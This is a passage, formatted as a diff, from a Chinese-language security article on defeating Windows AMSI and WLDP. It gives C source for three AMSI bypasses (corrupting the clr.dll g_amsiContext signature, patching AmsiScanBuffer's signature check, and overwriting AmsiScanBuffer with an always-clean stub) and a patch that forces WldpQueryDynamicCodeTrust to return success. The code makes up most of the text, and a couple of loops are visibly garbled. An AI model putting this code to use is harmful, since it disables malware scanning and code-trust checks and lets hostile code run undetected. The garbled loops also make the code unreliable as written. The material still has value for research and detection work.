@@ -1,0 +1,225 @@
+我们看到，CLR使用了一个名为g_amsiContext的全局变量，该变量指向AmsiInitialize在首次使用AmsiScan时创建的AMSI上下文。这里需要注意的是，如果AMSI的上下文被破坏，AmsiScan并不会抛出任何错误。如果AmsiScanBuffer返回S_OK，则只会检查amsiResult。使用COR_E_BADIMAGEFORMAT和ERROR_VIRUS_INFECTED来调用ThrowHR时，即使缓冲区确实包含有害代码，也会将其视为次要错误。但是，如果将格式错误的上下文传递给AmsiScanBuffer的话，它将返回E_INVALIDARG，并且永远不会检查缓冲区的内容。此外，AmsiScan并不关心AmsiScanBuffer失败的原因。但是，真正需要重点考察的应该是，“既然系统支持AMSI并且检测失败了，那么失败的原因到底是什么呢？”。
+## 第一种绕过AMSI机制的方法（篡改数据）
+Matt
+Graeber提供了一个PoC，它能够破坏CLR!g_amsiContext所指向的上下文数据，从而导致AmsiScanBuffer返回E_INVALIDARG。从CLR的实现代码可以看出，这种绕过方法是有效的，因为CLR!AmsiScan的结果永远不会是验证成功或失败。相反，它只会抛出一个错误，并在尝试加载有害软件时终止宿主应用程序。但是，托管.NET程序集的非托管应用程序可能会处理任何C++异常。Windows
+Defender仍会记录有害代码的检测结果，但非托管宿主应用程序在某些情况下会继续运行。要通过g_amsiContext禁用AMSI，可以搜索PEB.ProcessHeap指向的堆内存，也可以搜索.data段的虚拟地址空间，并查找其中的每个指针。下面的代码演示的是后一种方法。只有CLR调用AmsiScan之后，这种方法才能奏效。
+    BOOL DisableAMSI(VOID) {
+        LPVOID                   hCLR;
+        BOOL                     disabled = FALSE;
+        PIMAGE_DOS_HEADER        dos;
+        PIMAGE_NT_HEADERS        nt;
+        PIMAGE_SECTION_HEADER    sh;
+        DWORD                    i, j, res;
+        PBYTE                    ds;
+        MEMORY_BASIC_INFORMATION mbi;
+        _PHAMSICONTEXT           ctx;
+        hCLR = GetModuleHandleA("CLR");
+        if(hCLR != NULL) {
+          dos = (PIMAGE_DOS_HEADER)hCLR;  
+          nt  = RVA2VA(PIMAGE_NT_HEADERS, hCLR, dos->e_lfanew);  
+          sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
+                 nt->FileHeader.SizeOfOptionalHeader);
+          // scan all writeable segments while disabled == FALSE
+          for(i = 0; 
+              i FileHeader.NumberOfSections && !disabled; 
+              i++) 
+          {
+            // if this section is writeable, assume it's data
+            if (sh[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
+              // scan section for pointers to the heap
+              ds = RVA2VA (PBYTE, hCLR, sh[i].VirtualAddress);
+              for(j = 0; 
+                  j Signature == 0x49534D41) {
+                    // corrupt it
+                    ctx->Signature++;
+                    disabled = TRUE;
+                    break;
+                  }
+                }
+              }
+            }
+          }
+        }
+        return disabled;
+    }
+##  第二种绕过AMSI机制的方法（代码补丁方法1）
+CyberArk建议使用2条指令，即xor edi，edi，nop来修改AmsiScanBuffer。如果要hook该函数的话，可以借助Length
+Disassembler
+Engine（LDE）来计算在跳转到备用函数进行覆盖之前要保存的prolog字节的正确数量。由于传递给该函数的AMSI上下文已经过验证，并且其中一个测试要求签名为“AMSI”，因此，您可以找到该立即值，并将其更改为其他值。在下面的示例中，我们将通过代码来破坏相应的签名，而不是像Matt
+Graeber那样使用上下文/数据来破坏相应的签名。
+    BOOL DisableAMSI(VOID) {
+        HMODULE        dll;
+        PBYTE          cs;
+        DWORD          i, op, t;
+        BOOL           disabled = FALSE;
+        _PHAMSICONTEXT ctx;
+        // load AMSI library
+        dll = LoadLibraryExA(
+          "amsi", NULL, 
+          LOAD_LIBRARY_SEARCH_SYSTEM32);
+        if(dll == NULL) {
+          return FALSE;
+        }
+        // resolve address of function to patch
+        cs = (PBYTE)GetProcAddress(dll, "AmsiScanBuffer");
+        // scan for signature
+        for(i=0;;i++) {
+          ctx = (_PHAMSICONTEXT)&cs[i];
+          // is it "AMSI"?
+          if(ctx->Signature == 0x49534D41) {
+            // set page protection for write access
+            VirtualProtect(cs, sizeof(ULONG_PTR), 
+              PAGE_EXECUTE_READWRITE, &op);
+            // change signature
+            ctx->Signature++;
+            // set page back to original protection
+            VirtualProtect(cs, sizeof(ULONG_PTR), op, &t);
+            disabled = TRUE;
+            break;
+          }
+        }
+        return disabled;
+    }
+## 第三种绕过AMSI机制的方法（代码补丁方法2）
+Tal
+Liberman建议覆盖AmsiScanBuffer的prolog字节，以便使其返回1。下面的代码也会对该函数执行覆盖操作，以使其在CLR扫描每个缓冲区时都返回AMSI_RESULT_CLEAN和S_OK。
+    // fake function that always returns S_OK and AMSI_RESULT_CLEAN
+    static HRESULT AmsiScanBufferStub(
+      HAMSICONTEXT amsiContext,
+      PVOID        buffer,
+      ULONG        length,
+      LPCWSTR      contentName,
+      HAMSISESSION amsiSession,
+      AMSI_RESULT  *result)
+    {
+        *result = AMSI_RESULT_CLEAN;
+        return S_OK;
+    }
+    static VOID AmsiScanBufferStubEnd(VOID) {}
+    BOOL DisableAMSI(VOID) {
+        BOOL    disabled = FALSE;
+        HMODULE amsi;
+        DWORD   len, op, t;
+        LPVOID  cs;
+        // load amsi
+        amsi = LoadLibrary("amsi");
+        if(amsi != NULL) {
+          // resolve address of function to patch
+          cs = GetProcAddress(amsi, "AmsiScanBuffer");
+          if(cs != NULL) {
+            // calculate length of stub
+            len = (ULONG_PTR)AmsiScanBufferStubEnd -              (ULONG_PTR)AmsiScanBufferStub;
+            // make the memory writeable
+            if(VirtualProtect(
+              cs, len, PAGE_EXECUTE_READWRITE, &op))
+            {
+              // over write with code stub
+              memcpy(cs, &AmsiScanBufferStub, len);
+              disabled = TRUE;
+              // set back to original protection
+              VirtualProtect(cs, len, op, &t);
+            }
+          }
+        }
+        return disabled;
+    }
+应用补丁后，我们发现有害软件也会被标记为安全的软件。
+## 使用C语言编写的WLDP示例
+以下函数演示了如何使用Windows Lockdown Policy来检测内存中动态代码的可信任状况。
+    BOOL VerifyCodeTrust(const char *path) {
+        WldpQueryDynamicCodeTrust_t _WldpQueryDynamicCodeTrust;
+        HMODULE                     wldp;
+        HANDLE                      file, map, mem;
+        HRESULT                     hr = -1;
+        DWORD                       low, high;
+        // load wldp
+        wldp = LoadLibrary("wldp");
+        _WldpQueryDynamicCodeTrust = 
+          (WldpQueryDynamicCodeTrust_t)
+          GetProcAddress(wldp, "WldpQueryDynamicCodeTrust");
+        // return FALSE on failure
+        if(_WldpQueryDynamicCodeTrust == NULL) {
+          printf("Unable to resolve address for WLDP.dll!WldpQueryDynamicCodeTrust.\n");
+          return FALSE;
+        }
+        // open file reading
+        file = CreateFile(
+          path, GENERIC_READ, FILE_SHARE_READ,
+          NULL, OPEN_EXISTING, 
+          FILE_ATTRIBUTE_NORMAL, NULL); 
+        if(file != INVALID_HANDLE_VALUE) {
+          // get size
+          low = GetFileSize(file, &high);
+          if(low != 0) {
+            // create mapping
+            map = CreateFileMapping(file, NULL, PAGE_READONLY, 0, 0, 0);
+            if(map != NULL) {
+              // get pointer to memory
+              mem = MapViewOfFile(map, FILE_MAP_READ, 0, 0, 0);
+              if(mem != NULL) {
+                // verify signature
+                hr = _WldpQueryDynamicCodeTrust(0, mem, low);              
+                UnmapViewOfFile(mem);
+              }
+              CloseHandle(map);
+            }
+          }
+          CloseHandle(file);
+        }
+        return hr == S_OK;
+    }
+##  绕过WLDP机制的方法（代码补丁方法1）
+通过对该函数执行覆盖操作，使其始终返回S_OK。
+    // fake function that always returns S_OK
+    static HRESULT WINAPI WldpQueryDynamicCodeTrustStub(
+        HANDLE fileHandle,
+        PVOID  baseImage,
+        ULONG  ImageSize)
+    {
+        return S_OK;
+    }
+    static VOID WldpQueryDynamicCodeTrustStubEnd(VOID) {}
+    static BOOL PatchWldp(VOID) {
+        BOOL    patched = FALSE;
+        HMODULE wldp;
+        DWORD   len, op, t;
+        LPVOID  cs;
+        // load wldp
+        wldp = LoadLibrary("wldp");
+        if(wldp != NULL) {
+          // resolve address of function to patch
+          cs = GetProcAddress(wldp, "WldpQueryDynamicCodeTrust");
+          if(cs != NULL) {
+            // calculate length of stub
+            len = (ULONG_PTR)WldpQueryDynamicCodeTrustStubEnd -              (ULONG_PTR)WldpQueryDynamicCodeTrustStub;
+            // make the memory writeable
+            if(VirtualProtect(
+              cs, len, PAGE_EXECUTE_READWRITE, &op))
+            {
+              // over write with stub
+              memcpy(cs, &WldpQueryDynamicCodeTrustStub, len);
+              patched = TRUE;
+              // set back to original protection
+              VirtualProtect(cs, len, op, &t);
+            }
+          }
+        }
+        return patched;
+    }
+虽然本文描述的方法很容易被检测到，但是它们对于Windows
+10系统上最新版本的DotNet框架而言，仍然是有效的。实际上，只要攻击者能够篡改AMSI用来检测有害代码的数据或代码，就总能找到绕过这些安全机制的方法。
+## 参考文献
+  * [Bypassing Amsi using PowerShell 5 DLL Hijacking](http://cn33liz.blogspot.com/2016/05/bypassing-amsi-using-powershell-5-dll.html "Bypassing Amsi using PowerShell 5 DLL Hijacking by Cneelis")
+  * [Bypassing AMSI via COM Server Hijacking](https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/ "Bypassing AMSI via COM Server Hijacking")
+  * [Bypassing Device Guard with .NET Assembly Compilation Methods](http://www.exploit-monday.com/2017/07/bypassing-device-guard-with-dotnet-methods.html "Bypassing Device Guard with .NET Assembly Compilation Methods")
+  * [AMSI Bypass With a Null Character](http://standa-note.blogspot.com/2018/02/amsi-bypass-with-null-character.html "AMSI Bypass With a Null Character")
+  * [AMSI Bypass: Patching Technique](https://www.cyberark.com/threat-research-blog/amsi-bypass-patching-technique/ "AMSI Bypass: Patching Technique")
+  * [The Rise and Fall of AMSI](https://i.blackhat.com/briefings/asia/2018/asia-18-Tal-Liberman-Documenting-the-Undocumented-The-Rise-and-Fall-of-AMSI.pdf "The Rise and Fall of AMSI")
+  * [AMSI Bypass Redux](https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/ "AMSI Bypass Redux")
+  * [Exploring PowerShell AMSI and Logging Evasion](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/ "Exploring PowerShell AMSI and Logging Evasion")
+  * [Disabling AMSI in JScript with One Simple Trick](https://tyranidslair.blogspot.com/2018/06/disabling-amsi-in-jscript-with-one.html "Disabling AMSI in JScript with One Simple Trick")
+  * [Documenting and Attacking a Windows Defender Application Control Feature the Hard Way – A Case Study in Security Research Methodology](https://posts.specterops.io/documenting-and-attacking-a-windows-defender-application-control-feature-the-hard-way-a-case-73dd1e11be3a "Documenting and Attacking a Windows Defender Application Control Feature the Hard Way – A Case Study in Security Research Methodology")
+  * [How to bypass AMSI and execute ANY malicious Powershell code](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html "How to bypass AMSI and execute ANY malicious Powershell code")
+  * AmsiScanBuffer Bypass [Part 1](https://rastamouse.me/2018/10/amsiscanbuffer-bypass-part-1/ "Part 1"), [Part 2](https://rastamouse.me/2018/10/amsiscanbuffer-bypass-part-2/ "Part 2"),[ Part 3](https://rastamouse.me/2018/11/amsiscanbuffer-bypass-part-3/ " Part 3"), [Part 4](https://rastamouse.me/2018/12/amsiscanbuffer-bypass-part-4/ "Part 4")
+  * [PoC function to corrupt the g_amsiContext global variable in clr.dll](https://outflank.nl/blog/2019/04/17/bypassing-amsi-for-vba/ "PoC function to corrupt the g_amsiContext global variable in clr.dll")
+  * [Bypassing AMSI for VBA](https://outflank.nl/blog/2019/04/17/bypassing-amsi-for-vba/ "Bypassing AMSI for VBA")
